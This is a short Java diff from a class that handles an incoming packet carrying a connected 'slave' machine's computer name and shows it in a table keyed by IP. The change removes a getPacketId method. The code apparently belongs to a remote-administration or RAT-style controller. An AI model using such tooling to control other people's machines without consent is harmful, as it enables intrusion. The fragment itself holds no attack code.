@@ -13,10 +13,4 @@ public class Packet14InitComputerName extends AbstractIncomingPacket {
 		slave.setComputerName(slave.readLine());
 		Frame.mainModel.setValueAt("Unknown@" + slave.getComputerName(), Util.getRow(3, slave.getIP()), 5);
 	}
-
-	@Override
-	public byte getPacketId() {
-		return 14;
-	}
-
 }
